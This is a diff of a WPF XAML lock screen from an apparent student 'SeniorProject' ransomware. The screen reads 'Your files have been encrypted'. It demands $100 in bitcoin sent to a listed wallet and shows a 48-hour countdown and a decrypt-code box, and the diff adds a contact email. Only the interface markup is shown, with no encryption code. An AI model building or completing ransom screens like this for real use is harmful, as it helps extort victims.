@@ -6,13 +6,13 @@
              xmlns:local="clr-namespace:SeniorProject"
              mc:Ignorable="d" 
              d:DesignHeight="500" d:DesignWidth="1000">
-	<Grid>
+	<Grid Background="Red">
 		<Label x:Name="label" Content="Your files have been encrypted" HorizontalAlignment="Center" Margin="0,10,0,0" VerticalAlignment="Top" Height="114" Width="1000" FontSize="72" />
-		<TextBlock x:Name="textBlock" HorizontalAlignment="Center" Margin="10,393,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Height="97" Width="980" FontSize="22" TextAlignment="Center"><Run Text="Your files have been encrypted, and your computer is unusable until you pay a ransom. If you would like to pay the ransom, send $100 in bitcoin (0.02 Bitcoin) to Wallet ID : 1KgNfdanaFu1PkmfQ8RJngE4kpvDtApQaR"/><LineBreak/><Run/><LineBreak/><Run Text=""/></TextBlock>
+		<TextBlock x:Name="textBlock" HorizontalAlignment="Center" Margin="10,330,10,0" TextWrapping="Wrap" VerticalAlignment="Top" Height="160" Width="980" FontSize="22" TextAlignment="Center"><Run Text="Your files have been encrypted, and your computer is unusable until you pay a ransom. If you would like to pay the ransom, send $100 in bitcoin (0.02 Bitcoin) to Wallet ID : 1KgNfdanaFu1PkmfQ8RJngE4kpvDtApQaR"/><LineBreak/><Run Text="If you need assistance, email imadeavirusformyseniorproject@gmail.com and instructions will be"/><LineBreak/><Run Text="sent to you."/><LineBreak/><Run/><LineBreak/><Run/><LineBreak/><Run/><LineBreak/><Run Text=""/></TextBlock>
 		<Label x:Name="tbTime" HorizontalContentAlignment="Center" Content="48 Hours 0 Minutes" HorizontalAlignment="Center" Margin="15,104,10,0" VerticalAlignment="Top" Height="124" Width="975" FontSize="72"/>
-		<Label x:Name="label2" HorizontalContentAlignment="Center" Content="When the ransom has been paid, you can&#xD;&#xA;    enter the 32 digit decrypt code here:" HorizontalAlignment="Center" Margin="10,201,10,0" VerticalAlignment="Top" Height="62" Width="980" FontSize="20"/>
-		<TextBox x:Name="decryptBox" HorizontalAlignment="Center" Height="27" TextWrapping="Wrap" VerticalAlignment="Top" Width="242" Margin="0,300,0,0"/>
-		<Button x:Name="button" Content="Decrypt" HorizontalAlignment="Center"  VerticalAlignment="Top" Width="113" Height="25" Click="button_Click" Margin="0,350,0,0"/>
+		<Label x:Name="label2" HorizontalContentAlignment="Center" Content="When the ransom has been paid, you can&#xA;    enter the 256-bit decrypt code here:" HorizontalAlignment="Center" Margin="10,201,10,0" VerticalAlignment="Top" Height="62" Width="980" FontSize="20"/>
+		<TextBox x:Name="decryptBox" HorizontalAlignment="Center" Height="27" TextWrapping="Wrap" VerticalAlignment="Top" Width="242" Margin="379,268,379,0"/>
+		<Button x:Name="button" Content="Decrypt" HorizontalAlignment="Center"  VerticalAlignment="Top" Width="113" Height="25" Click="button_Click" Margin="441,300,446,0"/>
 
 	</Grid>
 </UserControl>
